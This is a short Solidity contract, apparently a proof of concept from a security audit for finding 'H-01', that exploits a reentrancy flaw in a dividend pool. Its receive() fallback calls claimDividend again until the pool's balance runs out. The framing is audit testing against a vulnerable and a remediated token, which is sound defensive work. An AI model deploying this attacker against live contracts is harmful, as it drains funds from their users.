// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IDividendPool {
    function claimDividend() external;
    function pendingDividend(address account) external view returns (uint256);
}

/// @notice Proof-of-concept attacker for H-01.
/// @dev Deliberately written against a minimal interface so the same attacker
///      can be pointed at both the vulnerable token and the remediated one.
contract ReentrantClaimer {
    IDividendPool public immutable pool;
    uint256 public reentries;

    constructor(address _pool) {
        pool = IDividendPool(_pool);
    }

    function attack() external {
        pool.claimDividend();
    }

    receive() external payable {
        uint256 share = pool.pendingDividend(address(this));
        if (share > 0 && address(pool).balance >= share) {
            reentries++;
            pool.claimDividend();
        }
    }
}
